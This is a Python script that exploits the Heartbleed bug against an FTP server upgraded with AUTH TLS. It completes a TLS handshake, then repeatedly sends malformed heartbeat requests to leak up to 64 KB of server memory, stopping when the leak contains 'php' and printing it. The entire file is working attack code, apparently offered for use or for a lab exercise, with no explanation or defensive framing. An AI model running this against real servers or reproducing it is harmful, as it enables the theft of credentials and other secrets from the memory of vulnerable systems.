#!/usr/bin/python3

import sys
import socket
import struct
import codecs

from utils import *

host = sys.argv[1]
port = sys.argv[2]

def bytes_to_int(b):
    return int(codecs.encode(b, 'hex'), 16)

def recv_ftp_resp(s):
    resp = s.recv(2)
    while b"\r" not in resp[-2:]:
        resp += s.recv(2)
    if resp[-1] != "\n":
        resp += s.recv(1)
    return resp.decode().strip()

def recv_bytes(s, length):
    data = b''
    while len(data) < length:
        chunk = s.recv(length - len(data))
        assert chunk
        data += chunk
    return data

def recv_tls_resp(s):
    header = recv_bytes(s, 5)
    ctype,v,length = struct.unpack('>BHH', header)
    data = recv_bytes(s, length)
    return ctype,data

def parse_tls_handshake(resp):
    messages = []
    while resp:
        ctype = resp[0]
        length = int.from_bytes(resp[1:4], 'big')
        messages.append((ctype, length, resp[4:4+length]))
        resp = resp[4+length:]
    return messages

print("Connecting to {}:{}".format(host, port))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, int(port)))
sys.stdout.write("Banner: ")
print(recv_ftp_resp(s))

print("Sending AUTH TLS...")
s.send(b"AUTH TLS\n")
resp = recv_ftp_resp(s)
print(resp)
assert "234" in resp
    
print("Sending TLSv1.2 Client Hello...")
s.send(hello_record())
server_hello_done = False
while not server_hello_done:
    resp = recv_tls_resp(s)
    assert resp[0] == 0x16 # we expect only handshakes in responses
    for message in parse_tls_handshake(resp[1]):
        if message[0] == 0x0e: # server hello done
            server_hello_done = True

def recv_heartbeat_responses(s, leng):
    data = b""
    while len(data) < leng:
        ctype,chunk = recv_tls_resp(s)
        assert ctype == 0x18 # heartbeat ssl record
        data += chunk
    return data
    

i = 0
s.settimeout(10)
while True:
    if i % 1000 == 0:
        print("Status: {} tries...".format(i))

    s.send(get_heartbeat())

    # fixme: we'll timeout here if it's not a vulnerable server
    resp = recv_heartbeat_responses(s, 0xFFFF)

    if b"php" in resp:
        print("Found php data! Dumping all printable characters:")
        print(''.join(chr(c) for c in resp if c >= 0x20 and c <= 0x7E))
        break

    i += 1

s.close()
